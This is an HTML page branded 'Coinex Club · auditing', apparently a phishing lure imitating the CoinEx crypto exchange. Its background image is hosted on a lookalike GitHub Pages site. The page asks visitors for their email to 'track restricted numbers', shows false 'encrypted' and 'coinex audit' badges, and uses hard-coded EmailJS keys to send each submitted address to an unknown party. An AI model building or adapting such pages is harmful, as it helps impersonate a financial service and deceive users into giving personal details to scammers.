<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Coinex Club · auditing</title>
  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    }

    body {
      min-height: 100vh;
      background: #0b1a1f;  /* fallback dark */
      background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
      background-repeat: no-repeat;
      background-position: center center;
      background-size: cover;
      background-attachment: fixed;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      margin: 0;
    }

    /* Glass-morphism card — frosted, white tint, with green-cyan border */
    .glass-card {
      width: 100%;
      max-width: 480px;
      padding: 44px 32px 40px;
      background: rgba(255, 255, 255, 0.12);
      backdrop-filter: blur(16px) saturate(180%);
      -webkit-backdrop-filter: blur(16px) saturate(180%);
      border-radius: 48px;
      border: 2px solid rgba(0, 255, 200, 0.5);
      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.7), 
                  inset 0 0 0 1px rgba(255, 255, 255, 0.08);
      transition: all 0.2s ease;
      color: #ffffff;
      text-align: center;
    }

    /* header */
    .club-title {
      font-size: 2.2rem;
      font-weight: 500;
      letter-spacing: -0.5px;
      color: white;
      text-shadow: 0 2px 12px rgba(0, 30, 20, 0.5);
      margin-bottom: 8px;
      word-break: break-word;
    }
    .club-title span {
      font-weight: 300;
      opacity: 0.8;
    }

    .sub-audit {
      font-size: 0.95rem;
      font-weight: 300;
      letter-spacing: 1px;
      color: rgba(220, 255, 240, 0.7);
      border-bottom: 1px solid rgba(0, 255, 200, 0.2);
      padding-bottom: 18px;
      margin-bottom: 28px;
      display: inline-block;
      text-transform: uppercase;
    }

    /* hint / description */
    .audit-hint {
      background: rgba(0, 40, 35, 0.25);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
      border-radius: 60px;
      padding: 12px 22px;
      margin-bottom: 32px;
      font-size: 0.95rem;
      font-weight: 350;
      color: rgba(255, 255, 255, 0.9);
      border: 1px solid rgba(0, 255, 200, 0.2);
      display: inline-block;
      letter-spacing: 0.3px;
      line-height: 1.5;
      backdrop-filter: blur(4px);
    }
    .audit-hint strong {
      font-weight: 500;
      color: #b5ffe6;
    }

    /* email field */
    .input-group {
      width: 100%;
      margin-bottom: 28px;
    }

    .input-group label {
      display: block;
      font-size: 0.8rem;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: rgba(200, 255, 235, 0.7);
      margin-bottom: 8px;
      font-weight: 300;
      text-align: left;
      padding-left: 6px;
    }

    .glass-input {
      width: 100%;
      padding: 18px 24px;
      font-size: 1.1rem;
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      border: 1.5px solid rgba(0, 255, 200, 0.35);
      border-radius: 60px;
      color: white;
      outline: none;
      transition: 0.2s;
      font-weight: 400;
      letter-spacing: 0.3px;
      box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.1);
    }

    .glass-input::placeholder {
      color: rgba(255, 255, 255, 0.45);
      font-weight: 300;
      letter-spacing: 0.2px;
    }

    .glass-input:focus {
      border-color: #6effe0;
      background: rgba(255, 255, 255, 0.15);
      box-shadow: 0 0 0 3px rgba(0, 255, 200, 0.15), inset 0 2px 8px rgba(0,0,0,0.1);
    }

    /* confirm button — glass style with green-cyan border */
    .confirm-btn {
      width: 100%;
      padding: 18px 24px;
      border: 1.5px solid #4de0c0;
      background: rgba(0, 255, 200, 0.08);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 80px;
      color: white;
      font-size: 1.3rem;
      font-weight: 450;
      letter-spacing: 0.5px;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 8px 24px -8px rgba(0, 30, 25, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      text-shadow: 0 2px 6px rgba(0, 20, 15, 0.4);
    }

    .confirm-btn:hover {
      background: rgba(0, 255, 200, 0.18);
      border-color: #7effe0;
      transform: scale(1.01);
      box-shadow: 0 12px 32px -10px #00ccaa40;
    }

    .confirm-btn:active {
      transform: scale(0.97);
    }

    .confirm-btn:disabled {
      opacity: 0.5;
      pointer-events: none;
      filter: grayscale(0.6);
      border-color: #3a8a7a;
    }

    /* small footer note */
    .footnote {
      margin-top: 28px;
      font-size: 0.7rem;
      color: rgba(200, 240, 225, 0.4);
      letter-spacing: 1px;
      border-top: 1px solid rgba(0, 255, 200, 0.08);
      padding-top: 22px;
      display: flex;
      justify-content: center;
      gap: 28px;
      flex-wrap: wrap;
    }
    .footnote span {
      opacity: 0.6;
    }

    /* error / status badge */
    .status-badge {
      display: inline-block;
      margin-top: 16px;
      font-size: 0.85rem;
      background: rgba(0, 40, 30, 0.3);
      backdrop-filter: blur(4px);
      padding: 6px 22px;
      border-radius: 40px;
      border: 1px solid rgba(0, 255, 200, 0.1);
      color: #b0f0dd;
      min-height: 36px;
      transition: 0.15s;
    }

    .status-badge.error {
      background: rgba(180, 30, 30, 0.25);
      border-color: #ff7a6e;
      color: #ffcbc0;
    }
    .status-badge.success {
      background: rgba(0, 200, 150, 0.2);
      border-color: #6effd0;
      color: #d4fff0;
    }

    /* spinner */
    .spinner {
      display: inline-block;
      width: 22px;
      height: 22px;
      border: 2px solid rgba(255,255,255,0.2);
      border-top: 2px solid #b5ffe6;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    /* responsive */
    @media (max-width: 480px) {
      .glass-card { padding: 32px 20px; }
      .club-title { font-size: 1.8rem; }
    }
  </style>
</head>
<body>
  <div class="glass-card" id="appCard">
    <!-- header -->
    <div class="club-title">Coinex <span>Club</span></div>
    <div class="sub-audit">🔍 auditing · limited phone</div>

    <!-- description -->
    <div class="audit-hint">
      <strong>⏳</strong> enter your email to track restricted numbers
    </div>

    <!-- email input -->
    <div class="input-group">
      <label for="emailInput">📧 email address</label>
      <input type="email" id="emailInput" class="glass-input" placeholder="you@example.com" autocomplete="email" spellcheck="false">
    </div>

    <!-- confirm button -->
    <button class="confirm-btn" id="confirmBtn">
      <span>✓</span> confirm
    </button>

    <!-- status / feedback -->
    <div id="statusMessage" class="status-badge">ready</div>

    <!-- footer -->
    <div class="footnote">
      <span>🔐 encrypted</span>
      <span>🛡️ coinex audit</span>
    </div>
  </div>

  <script>
    (function() {
      // ---------- EMAILJS config (your keys) ----------
      emailjs.init("PakuuN4ADUDEqrzHl");   // public key from your code

      // ---------- DOM refs ----------
      const emailInput = document.getElementById('emailInput');
      const confirmBtn = document.getElementById('confirmBtn');
      const statusDiv = document.getElementById('statusMessage');

      // ---------- helper: set status ----------
      function setStatus(text, type = '') {
        statusDiv.textContent = text;
        statusDiv.className = 'status-badge' + (type ? ' ' + type : '');
      }

      // ---------- reset status on typing ----------
      emailInput.addEventListener('input', function() {
        // only reset if it's not a success/error state that we want to keep? 
        // we want to clear error/success when user types again
        if (statusDiv.classList.contains('error') || statusDiv.classList.contains('success')) {
          setStatus('✏️ enter email', '');
        }
      });

      // ---------- confirm handler ----------
      async function handleConfirm() {
        const email = emailInput.value.trim();

        // validate email (simple)
        if (!email || !email.includes('@') || !email.includes('.')) {
          setStatus('⚠️ please enter a valid email', 'error');
          return;
        }

        // disable button, show spinner
        confirmBtn.disabled = true;
        const originalBtnHTML = confirmBtn.innerHTML;
        confirmBtn.innerHTML = `<span class="spinner"></span> sending`;

        setStatus('⏳ sending audit request...', '');

        try {
          // ---------- send via EmailJS (your service & template) ----------
          const templateParams = {
            email: email,
            to_name: 'Coinex Audit',
            from_name: 'Coinex Club',
            message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
            // you can add more fields if needed
          };

          const response = await emailjs.send(
            "service_j8bd9vn",        // your service ID
            "template_paduqpn",        // your template ID
            templateParams
          );

          console.log('✅ email sent', response);
          setStatus('✅ request sent — you will be notified', 'success');
          emailInput.value = '';       // clear field after success
        } catch (error) {
          console.warn('❌ email send error:', error);
          setStatus('⚠️ submission failed, try again', 'error');
        } finally {
          // restore button (but keep it enabled)
          confirmBtn.disabled = false;
          confirmBtn.innerHTML = originalBtnHTML;
        }
      }

      // ---------- attach event ----------
      confirmBtn.addEventListener('click', handleConfirm);

      // also allow Enter key on input field
      emailInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          if (!confirmBtn.disabled) {
            handleConfirm();
          }
        }
      });

      // ---------- initial status ----------
      setStatus('📬 enter your email', '');
    })();
  </script>
</body>
</html>
